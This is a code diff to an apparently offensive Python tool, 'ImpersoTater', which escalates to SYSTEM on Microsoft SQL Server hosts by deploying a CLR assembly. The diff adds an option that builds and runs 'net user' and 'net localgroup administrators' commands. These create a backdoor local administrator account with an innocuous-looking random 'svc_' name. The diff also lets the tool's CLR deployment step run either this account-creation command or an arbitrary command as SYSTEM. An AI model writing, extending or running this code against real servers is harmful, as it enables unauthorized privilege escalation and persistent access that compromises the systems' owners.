@@ -189,6 +189,25 @@ def enumerate_target(sql):
     return info
 
 
+def build_add_user_cmd(spec):
+    if spec == '_generate_':
+        import random, string
+        user = 'svc_' + ''.join(random.choices(string.ascii_lowercase, k=5))
+        passwd = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$', k=14))
+    elif ':' in spec:
+        user, passwd = spec.split(':', 1)
+    else:
+        print('[!] --add-user format: USER:PASS or omit for auto-generated', file=sys.stderr)
+        sys.exit(1)
+
+    print(f'[*] Will create local admin: {user} / {passwd}')
+    return (
+        f'net user {user} {passwd} /add && '
+        f'net localgroup administrators {user} /add && '
+        f'echo [+] Local admin created: {user}'
+    )
+
+
 def parse_args():
     p = argparse.ArgumentParser(
         description='ImpersoTater — In-memory SYSTEM escalation via MSSQL CLR assembly',
@@ -204,14 +223,18 @@ def parse_args():
     p.add_argument('-d', '--domain', metavar='DOMAIN', default='')
     p.add_argument('-w', '--windows-auth', action='store_true',
                    help='Use Windows/domain authentication')
-    p.add_argument('-c', '--command', required=True,
-                   help='Command to execute as SYSTEM')
+    action = p.add_mutually_exclusive_group(required=True)
+    action.add_argument('-c', '--command',
+                        help='Command to execute as SYSTEM')
+    action.add_argument('--add-user', nargs='?', const='_generate_',
+                        metavar='USER:PASS',
+                        help='Create local admin. USER:PASS or auto-generated if omitted')
+    action.add_argument('--enum-only', action='store_true',
+                        help='Only enumerate target, do not execute')
     p.add_argument('--technique', choices=['auto', 'spooler', 'direct'],
                    default='auto', help='Privilege escalation technique (default: auto)')
     p.add_argument('--no-cleanup', action='store_true',
                    help='Leave CLR assembly deployed after execution')
-    p.add_argument('--enum-only', action='store_true',
-                   help='Only enumerate target, do not execute')
     return p.parse_args()
 
 
@@ -265,13 +288,18 @@ def main():
         sql.disconnect()
         return
 
+    if args.add_user is not None:
+        cmd = build_add_user_cmd(args.add_user)
+    else:
+        cmd = args.command
+
     print('\n[*] Deploying CLR assembly...')
     dll_path = compile_dll()
 
     out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'clr strict security'")
     strict_was_on = '1' in out
 
-    result = deploy_clr(sql, dll_path, args.command, args.technique)
+    result = deploy_clr(sql, dll_path, cmd, args.technique)
 
     if not args.no_cleanup:
         cleanup_clr(sql, strict_was_on)
